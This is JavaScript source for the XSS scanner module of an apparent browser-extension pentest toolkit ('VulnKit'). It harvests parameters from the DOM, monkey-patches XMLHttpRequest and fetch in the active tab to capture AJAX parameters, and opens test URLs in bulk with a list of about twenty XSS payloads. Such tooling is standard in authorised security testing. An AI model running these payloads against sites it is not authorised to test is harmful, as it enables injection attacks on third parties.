// VulnKit - XSS Scanner
window.VulnKitXss = (function () {
  'use strict';

  let xssPoints = [];
  let xssFilterType = 'all';
  let xssInterceptTimer = null;
  let xssInterceptActive = false;
  let xssInterceptCountdown = 0;

  function getUtils() {
    return window.VulnKitUtils || null;
  }

  const XSS_SCAN_PAYLOADS = [
    { name: 'alert(1)', value: '<script>alert(1)</script>' },
    { name: 'img onerror', value: '<img src=x onerror=alert(1)>' },
    { name: 'svg onload', value: '<svg onload=alert(1)>' },
    { name: 'body onload', value: '<body onload=alert(1)>' },
    { name: 'svg script', value: '<svg><script>alert(1)</script></svg>' },
    { name: 'details ontoggle', value: '<details open ontoggle=alert(1)>' },
    { name: 'img src onerror', value: '<img src=1 onerror=alert(1)>' },
    { name: 'input onfocus', value: '<input onfocus=alert(1) autofocus>' },
    { name: 'marquee onstart', value: '<marquee onstart=alert(1)>' },
    { name: 'select onchange', value: '<select onchange=alert(1)><option>1</option></select>' },
    { name: 'textarea onfocus', value: '<textarea onfocus=alert(1) autofocus>' },
    {
      name: 'keyframe anim',
      value:
        '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">',
    },
    {
      name: 'math xss',
      value:
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>',
    },
    { name: 'object data', value: '<object data="javascript:alert(1)">' },
    { name: 'embed src', value: '<embed src="javascript:alert(1)">' },
    { name: 'a href js', value: '<a href="javascript:alert(1)">click</a>' },
    { name: 'window.location', value: "<script>window.location='javascript:alert(1)'</script>" },
    { name: 'eval payload', value: "<script>eval('alert(1)')</script>" },
    { name: 'fromCharCode', value: '<script>alert(String.fromCharCode(88,83,83))</script>' },
    { name: 'constructor', value: "''.constructor.constructor('alert(1)')()" },
  ];

  async function harvestXssParamsFromDom() {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.id) return [];
    const results = await chrome.scripting.executeScript({
      target: { tabId: tab.id },
      func: () => {
        const pageUrl = location.href;
        const collected = [];
        const seen = new Set();

        function addPoint(source, url, param, method) {
          if (!url || !param) return;
          let fullUrl;
          try {
            fullUrl = new URL(url, pageUrl).href;
          } catch {
            return;
          }
          const key = fullUrl + '|' + param + '|' + method;
          if (seen.has(key)) return;
          seen.add(key);
          collected.push({ source, url: fullUrl, param, method });
        }

        document.querySelectorAll('a[href]').forEach(a => {
          try {
            const href = new URL(a.href, pageUrl);
            if (href.origin !== location.origin) return;
            href.searchParams.forEach((_, key) => {
              addPoint('link', href.pathname + href.search, key, 'GET');
            });
          } catch {}
        });

        document.querySelectorAll('form').forEach(form => {
          const action = form.getAttribute('action') || pageUrl;
          const method = (form.getAttribute('method') || 'GET').toUpperCase();
          form.querySelectorAll('input[name], select[name], textarea[name]').forEach(el => {
            const name = el.getAttribute('name');
            if (!name) return;
            addPoint('form', action, name, method);
          });
        });

        try {
          const currentUrl = new URL(pageUrl);
          currentUrl.searchParams.forEach((_, key) => {
            addPoint('url', currentUrl.pathname + currentUrl.search, key, 'GET');
          });
        } catch {}

        return collected;
      },
    });
    return results?.[0]?.result || [];
  }

  function startXssIntercept() {
    const utils = getUtils();
    xssInterceptActive = true;
    xssInterceptCountdown = 30;
    utils.get('xssscan-start-intercept-btn').disabled = true;
    utils.get('xssscan-stop-intercept-btn').disabled = false;
    updateXssInterceptStatus();

    chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
      if (!tabs[0]?.id) return;
      const tabId = tabs[0].id;

      chrome.scripting.executeScript({
        target: { tabId },
        world: 'MAIN',
        func: () => {
          if (window.__XSS_INTERCEPT__) return 'already_injected';
          window.__XSS_INTERCEPT__ = [];
          const origOpen = XMLHttpRequest.prototype.open;
          const origSend = XMLHttpRequest.prototype.send;
          const origFetch = window.fetch;

          XMLHttpRequest.prototype.open = function (method, url) {
            this.__xss_method = method;
            this.__xss_url = url;
            return origOpen.apply(this, arguments);
          };
          XMLHttpRequest.prototype.send = function (body) {
            if (this.__xss_url) {
              try {
                const u = new URL(this.__xss_url, location.href);
                u.searchParams.forEach((_, k) => {
                  window.__XSS_INTERCEPT__.push({
                    url: u.pathname + u.search,
                    param: k,
                    method: this.__xss_method || 'GET',
                  });
                });
              } catch {}
            }
            if (typeof body === 'string' && body) {
              try {
                const params = new URLSearchParams(body);
                params.forEach((_, k) => {
                  const fallbackUrl = this.__xss_url || location.href;
                  try {
                    const u = new URL(fallbackUrl, location.href);
                    window.__XSS_INTERCEPT__.push({
                      url: u.pathname,
                      param: k,
                      method: this.__xss_method || 'POST',
                    });
                  } catch {}
                });
              } catch {}
            }
            return origSend.apply(this, arguments);
          };

          window.fetch = function (input, init) {
            const url =
              typeof input === 'string'
                ? input
                : input instanceof Request
                  ? input.url
                  : String(input);
            try {
              const u = new URL(url, location.href);
              u.searchParams.forEach((_, k) => {
                window.__XSS_INTERCEPT__.push({
                  url: u.pathname + u.search,
                  param: k,
                  method: (init?.method || 'GET').toUpperCase(),
                });
              });
            } catch {}
            if (init?.body && typeof init.body === 'string') {
              try {
                const params = new URLSearchParams(init.body);
                params.forEach((_, k) => {
                  try {
                    const u = new URL(url, location.href);
                    window.__XSS_INTERCEPT__.push({
                      url: u.pathname,
                      param: k,
                      method: (init?.method || 'POST').toUpperCase(),
                    });
                  } catch {}
                });
              } catch {}
            }
            return origFetch.apply(this, arguments);
          };
          return 'injected';
        },
      });

      xssInterceptTimer = setInterval(async () => {
        xssInterceptCountdown--;
        updateXssInterceptStatus();
        if (xssInterceptCountdown <= 0) {
          stopXssIntercept();
          return;
        }
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId },
            world: 'MAIN',
            func: () => {
              const data = window.__XSS_INTERCEPT__ || [];
              window.__XSS_INTERCEPT__ = [];
              return data;
            },
          });
          const captured = results?.[0]?.result || [];
          if (captured.length > 0) {
            const existing = new Set(xssPoints.map(p => p.url + '|' + p.param + '|' + p.method));
            const newPoints = captured
              .map(p => ({ ...p, source: 'ajax' }))
              .filter(p => !existing.has(p.url + '|' + p.param + '|' + p.method));
            if (newPoints.length > 0) {
              xssPoints = [...xssPoints, ...newPoints];
              renderXssPoints();
            }
          }
        } catch {}
      }, 2000);
    });
  }

  function stopXssIntercept() {
    const utils = getUtils();
    if (xssInterceptTimer) {
      clearInterval(xssInterceptTimer);
      xssInterceptTimer = null;
    }
    xssInterceptActive = false;
    utils.get('xssscan-start-intercept-btn').disabled = false;
    utils.get('xssscan-stop-intercept-btn').disabled = true;
    updateXssInterceptStatus();
  }

  function updateXssInterceptStatus() {
    const utils = getUtils();
    const el = utils.get('xssscan-status');
    if (!el) return;
    if (xssInterceptActive) {
      el.textContent = '拦截监听中... 剩余 ' + xssInterceptCountdown + 's（请操作页面触发请求）';
      el.style.color = '#e67e22';
    } else {
      el.textContent = '点击「采集参数」开始扫描当前页面';
      el.style.color = '';
    }
  }

  function getFilteredXssPoints() {
    if (xssFilterType === 'all') return xssPoints;
    return xssPoints.filter(p => p.source === xssFilterType);
  }

  function renderXssPoints() {
    const utils = getUtils();
    const container = utils.get('xssscan-results');
    const countEl = utils.get('xssscan-count');
    if (!container) return;
    const filtered = getFilteredXssPoints();
    if (countEl)
      countEl.textContent =
        '共发现 ' +
        xssPoints.length +
        ' 个注入点' +
        (xssFilterType !== 'all' ? '（筛选: ' + filtered.length + '）' : '');
    if (filtered.length === 0) {
      container.innerHTML = '<div class="empty-state">暂无注入点</div>';
      return;
    }
    const sourceLabels = { link: '链接', form: '表单', url: 'URL', ajax: 'AJAX' };
    const sourceColors = { link: '#4A90E2', form: '#e67e22', url: '#27ae60', ajax: '#e74c3c' };
    let html =
      '<table class="xssscan-table"><thead><tr><th><input type="checkbox" id="xssscan-check-all" checked></th><th>来源</th><th>URL</th><th>参数</th><th>方法</th></tr></thead><tbody>';
    filtered.forEach((p, i) => {
      const shortUrl = p.url.length > 40 ? p.url.substring(0, 37) + '...' : p.url;
      html +=
        '<tr>' +
        '<td><input type="checkbox" class="xssscan-point-check" data-idx="' +
        i +
        '" checked></td>' +
        '<td><span class="xssscan-source-tag" style="background:' +
        (sourceColors[p.source] || '#999') +
        '">' +
        (sourceLabels[p.source] || p.source) +
        '</span></td>' +
        '<td class="xssscan-url-cell" title="' +
        utils.escapeHtml(p.url) +
        '">' +
        utils.escapeHtml(shortUrl) +
        '</td>' +
        '<td class="xssscan-param-cell">' +
        utils.escapeHtml(p.param) +
        '</td>' +
        '<td>' +
        utils.escapeHtml(p.method) +
        '</td>' +
        '</tr>';
    });
    html += '</tbody></table>';
    container.innerHTML = html;

    const checkAll = container.querySelector('#xssscan-check-all');
    if (checkAll) {
      checkAll.addEventListener('change', () => {
        container.querySelectorAll('.xssscan-point-check').forEach(cb => {
          cb.checked = checkAll.checked;
        });
      });
    }
  }

  function getSelectedXssPoints() {
    const filtered = getFilteredXssPoints();
    const checks = document.querySelectorAll('.xssscan-point-check');
    return filtered.filter((_, i) => {
      const cb = checks[i];
      return cb && cb.checked;
    });
  }

  function encodePayload(payload, encoding) {
    switch (encoding) {
      case 'url':
        return encodeURIComponent(payload);
      case 'html':
        return payload
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;');
      case 'base64':
        return btoa(unescape(encodeURIComponent(payload)));
      default:
        return payload;
    }
  }

  function buildXssTestUrl(point, payload) {
    try {
      const url = new URL(point.url, 'about:blank');
      if (point.method === 'GET') {
        url.searchParams.set(point.param, payload);
        return url.href;
      }
      return url.href;
    } catch {
      return null;
    }
  }

  function getSelectedPayload() {
    const utils = getUtils();
    const selectEl = utils.get('xssscan-payload-select');
    const customEl = utils.get('xssscan-custom-payload');
    if (customEl && customEl.value.trim()) return customEl.value.trim();
    if (selectEl && selectEl.value) return selectEl.value;
    return XSS_SCAN_PAYLOADS[0].value;
  }

  async function handleXssHarvest() {
    const utils = getUtils();
    const statusEl = utils.get('xssscan-status');
    if (statusEl) {
      statusEl.textContent = '正在采集页面参数...';
      statusEl.style.color = '#4A90E2';
    }
    try {
      const domPoints = await harvestXssParamsFromDom();
      const existing = new Set(xssPoints.map(p => p.url + '|' + p.param + '|' + p.method));
      const newPoints = domPoints.filter(
        p => !existing.has(p.url + '|' + p.param + '|' + p.method)
      );
      xssPoints = [...xssPoints, ...newPoints];
      renderXssPoints();
      if (statusEl) {
        statusEl.textContent =
          '采集完成，新增 ' + newPoints.length + ' 个注入点，共 ' + xssPoints.length + ' 个';
        statusEl.style.color = '#27ae60';
      }
      if (newPoints.length > 0)
        utils.showToast('发现 ' + newPoints.length + ' 个注入点', 'success');
      else utils.showToast('未发现新的注入点', 'info');
    } catch (e) {
      if (statusEl) {
        statusEl.textContent = '采集失败: ' + e.message;
        statusEl.style.color = '#e74c3c';
      }
      utils.showToast('采集失败', 'error');
    }
  }

  async function handleBatchOpenXss() {
    const utils = getUtils();
    const selected = getSelectedXssPoints();
    if (selected.length === 0) {
      utils.showToast('没有选中的注入点', 'warning');
      return;
    }
    const rawPayload = getSelectedPayload();
    const encoding = (utils.get('xssscan-encoding') || {}).value || 'none';
    const payload = encodePayload(rawPayload, encoding);
    let opened = 0;
    for (const point of selected) {
      const url = buildXssTestUrl(point, payload);
      if (url) {
        chrome.tabs.create({ url, active: false });
        opened++;
      }
    }
    utils.showToast('已打开 ' + opened + ' 个测试页面', 'success');
  }

  function handleCopyXssUrls() {
    const utils = getUtils();
    const selected = getSelectedXssPoints();
    if (selected.length === 0) {
      utils.showToast('没有选中的注入点', 'warning');
      return;
    }
    const rawPayload = getSelectedPayload();
    const encoding = (utils.get('xssscan-encoding') || {}).value || 'none';
    const payload = encodePayload(rawPayload, encoding);
    const urls = selected.map(p => buildXssTestUrl(p, payload)).filter(Boolean);
    if (urls.length === 0) {
      utils.showToast('无法生成测试URL', 'warning');
      return;
    }
    utils.copyText(urls.join('\n'));
    utils.showToast('已复制 ' + urls.length + ' 个URL', 'success');
  }

  function initXssScanPayloadSelect() {
    const utils = getUtils();
    const select = utils.get('xssscan-payload-select');
    if (!select) return;
    XSS_SCAN_PAYLOADS.forEach(p => {
      const opt = document.createElement('option');
      opt.value = p.value;
      opt.textContent = p.name;
      select.appendChild(opt);
    });
    var xssData = window.VulnKitPayload ? window.VulnKitPayload.XSS_DATA : null;
    if (xssData) {
      Object.keys(xssData).forEach(cat => {
        const group = document.createElement('optgroup');
        group.label = cat;
        xssData[cat].forEach(payload => {
          const opt = document.createElement('option');
          opt.value = payload;
          opt.textContent = payload.length > 50 ? payload.substring(0, 47) + '...' : payload;
          group.appendChild(opt);
        });
        select.appendChild(group);
      });
    }
  }

  return {
    startXssIntercept,
    stopXssIntercept,
    updateXssInterceptStatus,
    renderXssPoints,
    handleXssHarvest,
    handleBatchOpenXss,
    handleCopyXssUrls,
    initXssScanPayloadSelect,
    get xssPoints() {
      return xssPoints;
    },
    set xssPoints(v) {
      xssPoints = v;
    },
    get xssFilterType() {
      return xssFilterType;
    },
    set xssFilterType(v) {
      xssFilterType = v;
    },
  };
})();
